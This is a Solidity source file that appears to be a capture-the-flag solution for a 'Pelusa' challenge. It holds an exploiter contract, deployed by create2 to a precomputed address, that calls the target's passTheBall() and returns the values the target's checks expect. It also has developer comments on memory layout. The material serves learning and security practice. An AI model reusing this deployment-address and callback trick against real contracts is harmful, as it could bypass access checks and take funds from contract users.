pragma solidity >= 0.8.13;

import "./Game.sol";

contract Exploiter {
    address immutable Pelusa;
    address internal player;
    uint public goals;
    address game;

    constructor() {
        Pelusa = 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95; // pre-computed address. In practice, we would know where the Pelusa contract was deployed beforehand so would replace this value with the Pelusa address.
        // saves us the need to import a Pelusa interface
        address(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95).call(abi.encodeWithSignature("passTheBall()"));
        // player = address(new Game()); // this is actually the address of the **Game** contract
    }

    function updateGameAddress(address addr) public {
        game = addr;
    }
    
    function getBallPossesion() public view returns(address owner) {
        owner = Game(game).getBallPossesion();
    }

    function handOfGod() public returns(uint256 val) {
        goals = 2;
        // memory array is returned as 32 bytes of starting location, 32 bytes of length, and then actual values.
        // Coering type of `bytes memory` to `bytes32` is big-endian - `0x51` becomes `0x5100000...` - but if there are over 32 bytes, it will just be copied exactly.
            // i.e. 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a3078626162616261626100000000000000000000000000000000000000000000 gets coerced to `0x00...20`.
        // Given that, how to return the bytes version of `22_06_1986`? Does the array need to start at `150A3A2`?
        // never mind, you can just return a uint
        val = 22061986;
    }
}

contract ExploiterDeployer {
    function deploySimple(bytes calldata byteCode, uint salt) public returns(address newContract) {
        uint codeLength = byteCode.length;
        assembly {
            let ptr := mload(0x40)
            /* 
            Copies relevant calldata to next free slot
            Memory layout is as follows:
                0x00 - 0x04: function signature
                0x04 - 0x24: pointer to length of byteCode
                0x24 - 0x44: salt
                0x44 - 0x64: length of byteCode
                0x64 onward: byteCode bytes
            */
            calldatacopy(ptr, 0x64, codeLength)
            newContract := create2(0, ptr, codeLength, salt)    
        }
    }
}